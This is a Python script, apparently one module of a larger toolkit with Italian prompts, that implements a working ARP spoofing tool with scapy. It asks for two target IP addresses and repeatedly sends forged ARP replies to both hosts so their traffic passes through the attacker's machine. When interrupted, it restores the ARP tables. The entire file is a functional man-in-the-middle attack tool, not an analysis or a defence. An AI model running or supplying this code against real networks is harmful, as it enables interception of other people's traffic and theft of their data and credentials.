import scapy.all as scapy
import time
import logging
import sys

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def spoof(target_host, spoof_host):
    target_mac = get_mac(target_host)
    if target_mac is None:
        print(f"[!] Could not resolve MAC address for {target_host}. Skipping.")
        return
    packet = scapy.ARP(op=2, pdst=target_host, hwdst=target_mac, psrc=spoof_host)
    scapy.send(packet, verbose=False)

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"[!] No response from {ip}")
        return None

def clean_target_arp_table(destination_host, source_host):
    destination_mac = get_mac(destination_host)
    source_mac = get_mac(source_host)
    if destination_mac is None or source_mac is None:
        print("[!] Failed to restore ARP table.")
        return
    packet = scapy.ARP(op=2, pdst=destination_host, hwdst=destination_mac, psrc=source_host, hwsrc=source_mac)
    scapy.send(packet, count=5, verbose=False)

def run():
    print("\n[+] ARP Spoofing Tool")
    
    # Chiedi all'utente gli indirizzi IP manualmente
    target1_host = input("Inserisci l'IP del primo target: ")
    target2_host = input("Inserisci l'IP del secondo target: ")

    packet_counter = 0
    try:
        print("[+] ARP Spoofing in corso... Premi CTRL+C per terminare.")
        while True:
            spoof(target1_host, target2_host)
            spoof(target2_host, target1_host)
            print(f"\rSpoofing packets sent: {packet_counter}", end="", flush=True)
            packet_counter += 2
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[+] Interruzione rilevata! Ripristino delle tabelle ARP...")
        clean_target_arp_table(target1_host, target2_host)
        clean_target_arp_table(target2_host, target1_host)
        print("[+] Tabelle ARP ripristinate. Tornando al menu principale.")
        return
